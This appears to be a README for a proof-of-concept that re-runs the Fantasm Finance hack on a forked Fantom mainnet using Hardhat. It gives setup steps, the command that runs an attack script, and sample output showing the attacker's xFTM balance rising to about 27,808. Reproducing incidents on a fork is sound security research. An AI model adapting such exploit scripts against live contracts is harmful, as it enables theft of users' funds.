# Fantasm Finance re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/fantom/mainnet (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
xFTM balance of attacker :  0.0
Exploiting...
Exploit complete.
xFTM balance of attacker :  27808.380491957617661247
```
This means the attack is complete
> The block height of the fork is 32971742


## Link

* https://twitter.com/fantasm_finance/status/1501569232881995785
* https://www.tofreedom.me/fantasm-finance
